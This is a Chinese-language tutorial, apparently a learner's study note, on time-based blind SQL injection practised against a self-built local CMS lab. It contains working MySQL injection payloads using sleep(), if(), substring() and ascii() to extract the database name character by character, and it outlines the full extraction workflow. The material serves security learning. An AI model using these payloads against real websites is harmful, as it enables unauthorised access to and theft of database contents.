# 延时注入

## 一、环境

- 靶场：自建本地 CMS 靶场（PHP + MySQL + Apache）
- 工具：Burp Suite + HackBar
- 数据库：MySQL

## 二、什么是延时注入

延时注入属于**盲注**的一种。

当页面既没有直接回显数据，也没有明显的 True / False 页面差异时，可以让数据库**故意延迟响应**，通过判断响应时间来推测条件是否成立。

核心就是：

**条件成立 → 延迟**

**条件不成立 → 正常返回**

## 三、基本判断

先测试 `sleep()`：

```sql
' and sleep(5)--+
```

如果请求明显延迟约 5 秒，说明 `sleep()` 被执行。

然后使用条件控制延迟：

```sql
' and if(1=1,sleep(5),0)--+
```

条件 `1=1` 成立：

```text
→ 延迟 5 秒
```

如果：

```sql
' and if(1=2,sleep(5),0)--+
```

条件不成立：

```text
→ 不延迟
```

## 四、核心函数

### 1. sleep()

让 MySQL 暂停指定秒数：

```sql
sleep(5)
```

表示延迟 5 秒。

### 2. if()

根据条件决定执行什么：

```sql
if(条件,条件成立时执行,条件不成立时执行)
```

例如：

```sql
if(1=1,sleep(5),0)
```

表示：

```text
如果 1=1
→ sleep(5)

否则
→ 0
```

## 五、利用延时判断数据

例如判断当前数据库名第一个字符是不是 `t`：

```sql
' and if(substring(database(),1,1)='t',sleep(5),0)--+
```

如果请求明显延迟：

```text
→ 条件成立
→ 第一个字符可能是 t
```

如果没有明显延迟：

```text
→ 条件不成立
```

也可以结合 `ascii()`：

```sql
' and if(ascii(substring(database(),1,1))=116,sleep(5),0)--+
```

这里：

- `database()`：当前数据库名
- `substring()`：截取指定位置字符
- `ascii()`：转换成 ASCII 数值
- `if()`：判断条件
- `sleep()`：条件成立时制造延迟

## 六、和布尔盲注的区别

### 布尔盲注

通过：

```text
True / False
```

造成页面内容或状态的差异。

```text
条件成立 → 页面 A
条件不成立 → 页面 B
```

### 延时注入

通过：

```text
响应时间
```

来判断。

```text
条件成立 → 延迟
条件不成立 → 正常
```

所以可以简单记：

**布尔盲注看“页面变化”，延时注入看“时间变化”。**

## 七、基本流程

```text
发现 SQL 注入点
      ↓
测试 sleep()
      ↓
确认是否存在延时
      ↓
加入 if() 判断条件
      ↓
观察响应时间
      ↓
逐步判断数据库中的数据
```

## 八、我的理解

延时注入本质上和布尔盲注一样，都是**盲注**。

区别只是：

```text
布尔盲注：
条件 → 页面变化

延时注入：
条件 → 响应时间变化
```

当页面没有明显的内容差异时，就可以利用响应时间作为“答案”。

例如：

> “数据库名第一个字符是不是 `t`？”

不是直接让数据库返回 `t`，而是：

> “如果是 `t`，就睡 5 秒。”

然后通过请求是否明显变慢来判断。

## 九、关键知识点

```text
延时注入
├── sleep()
├── if()
├── database()
├── substring()
├── ascii()
└── 根据响应时间判断条件
```

核心记忆：

**延时注入 = 利用数据库延迟响应，把“条件是否成立”转换成“响应时间是否发生变化”。**